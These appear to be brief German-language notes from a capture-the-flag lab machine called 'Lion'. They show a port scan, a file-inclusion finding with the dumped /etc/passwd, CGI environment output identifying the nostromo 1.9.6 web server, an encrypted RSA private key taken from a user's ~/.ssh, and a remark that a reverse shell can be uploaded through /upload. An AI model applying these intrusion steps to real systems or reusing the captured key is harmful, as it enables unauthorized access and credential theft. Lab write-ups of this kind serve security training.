# 🐧 Lion



```
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
5555/tcp open  freeciv
8080/tcp open  http-proxy
9999/tcp open  abyss
```

<pre><code>dirb:5555

?page=&#x3C;x>.php # inclusion

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
<strong>alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
</strong><strong>marty:x:1001:1001:,,,:/home/marty:/bin/bash
</strong><strong>gloria:x:1002:1002:,,,:/home/gloria:/bin/bash
</strong></code></pre>

{% code overflow="wrap" fullWidth="false" %}
```
:8080/cgi-bin/

GATEWAY_INTERFACE=CGI/1.1
REMOTE_ADDR=10.14.66.169
DOCUMENT_ROOT=/var/nostromo/htdocs
REMOTE_PORT=14043
HTTP_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.10.180.243 Port 8080</address>
SCRIPT_FILENAME=/var/nostromo/htdocs/cgi-bin/printenv
HTTP_HOST=10.10.180.243:8080
REQUEST_URI=/cgi-bin/printenv
SERVER_SOFTWARE=nostromo 1.9.6
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_PROTOCOL=HTTP/1.1
HTTP_ACCEPT_ENCODING=gzip, deflate
REQUEST_METHOD=GET
SERVER_ADMIN=webmaster@nazgul.ch
SERVER_ADDR=127.0.0.1
PWD=/var/nostromo/htdocs/cgi-bin
SERVER_PORT=8080
SCRIPT_NAME=/cgi-bin/printenv
SERVER_NAME=10.10.180.243:8080
```
{% endcode %}

```
GLORIA id_rsa in ~/.ssh

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,DEA2FCB97D9A7EE91BB5502188F24BCA

5m/tHlXFlre3iBu/0wnnfEyS/p7qd0yjLDuG3jblth2CpwqIvPjGGq6hoFr6xdZO
8DOR/D16XDblHvvpJBlVfqHuXzIFbqDYCgvAeB8cZbxLaqhSi0H5fHT+N0MrMM5H
p3ejg2Nwk67BxygtjnvYgXKu+ALk0/NLDAj0NzztX+yOsSPvsyR2UjUSo352pMBt
lokw3kshMcqKs0G1UhBphV5bUgUTA0nPi5WBlIdmWC+Re0EHH+RvLulg0AxR6v5Q
UxqJJ/i0dLp6N7nTFANde+I5JwPEDJ/SGJJRWB/srcpVz3PSZuEJht83nmcJRZCz
S/x7iOhIUA1vBlexg/Td911H/95sofArhZDMPX54IMO7/q5AfIjDpqD8U9Pts7R0
aBq+1m2RfVB85FM11kJv5T0uNW6t5dP8BVb7Jqz60okgJg4cJMu5YMX7vj3xCxxy
5Hlc7PA/kIy/y2tRJmArvheuFB7qjRIPcuw1gw1TKDCUHS29aiN+ePCS4f236/if
9VwHnfp8wCUnO6ApRX9sJ6iAPMA8JYFpylIL/0XqEjZdu+ESWetTfGzsxXRdeNkY
L1/H4W9mNNIbNTnL3irr4SuKowFpKwxp6xhloZ4boyiWsdfLpmtUBE5euxjlppWp
2y7ZbtuKiqdTHkhPOZOnx7oi2FmWw81P4wS6nF2ObPpSq5LGf9TiLEw5i0icedkp
rnd/qkhkBuIQb6CKlW9m3AXgMRVQXa78J1lx60FdO1B9mtuhOy529GcwVkWh856x
MesHWvY33GmW0QcVKnUqhhFDbkT0l/X7UERTMAHVKZhfPeChuo/7LoqUqdMI57Se
U66OS9bu0INLLwcSlOAL9aweynt8MFo1DS+xQsJWTLSBnVz7iT6IMYUfhtO3gi5/
Oginxw/FPmGJ6THuFWi15k9dDdO3nBJhAQDHRpMYi4BLm/xPF7EXhgiGy6sBVGrF
PYlXHZvlQEJvHd/DCw0uwolEc3z4CilGKz1BX0WbCp9cEgkmM+Ez7QTvvBa5i6kg
qh1pAaZ+cNFDJi9bn76qEaCLCd1FMPnpcZgMUgwBfyKM+1YXa0gbxlS8fqgU066j
Mol50cLTM8D4tny3OvPcjW4FveCkhqJjGK7DY1Us7R3VDWAjOYIaMqSIM2ip6iLZ
ukq7K1r0t68eVDuDGcMLjfVihGywyqglqnqaXYcJ8+19ae76E3HVFIWbSU409fMp
fs8r6QLnuxvX1HHa74Hctuo6fzB7qokKV51ChmpXjN8h5uwEl0msbJSrKlIeYy0S
uURTlfqDq50HBr2yJYeuDzEpRjZuucXqkCIRZLSjKedf9mBtMq/3CvN9K/P45A2H
BYxl0pcZPaeUiwdR/bycLK1tBZm5kVSGIU2fK7IsKrgqZxzKS6kdr2FFsKs3HWMF
ScVJZPT4dqDo3PSIQUw7q0GixCLLdDU9p45CSKPVySYyiGU22RTQS2ccGEcCTurj
lcY0pO4wZmm5GkseF5moa/1c3aOUZOESAlWGpEg5PNPt3U/SWJTpziGv3NY5DLq9
R9OsbX0gkO711f8RvRTELQIYFIO/0LcKTjY16g8MtBlMKYCyJ0cWLVWAUoggJxiR
-----END RSA PRIVATE KEY-----
```

**\<ip>:80/upload** kann eine rshell hochgeladen werden und in **./uploads** geöffnet werden









